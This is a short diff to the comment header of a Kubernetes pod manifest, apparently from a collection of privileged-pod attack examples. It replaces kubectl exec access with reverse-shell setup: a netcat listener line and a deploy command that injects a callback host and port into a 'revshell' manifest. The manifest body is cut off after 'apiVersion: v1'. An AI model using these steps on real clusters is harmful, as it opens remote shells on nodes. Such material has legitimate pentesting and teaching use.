@@ -1,6 +1,6 @@
 ###########################################################
-## Deploy: kubectl -n [namespace] apply -f pod-hostpid.yaml 
-## Access: kubectl -n [namespace] exec -it pod-hostpid -- bash
+## Set up Listener: nc -nvlp [PORT]
+## Deploy: HOST="10.0.0.1" PORT="3116" envsubst < pod-hostpid-revshell.yaml | kubectl apply -f -
 ## Remove: kubectl -n [namespace] delete pod-hostpid
 ###########################################################
 apiVersion: v1
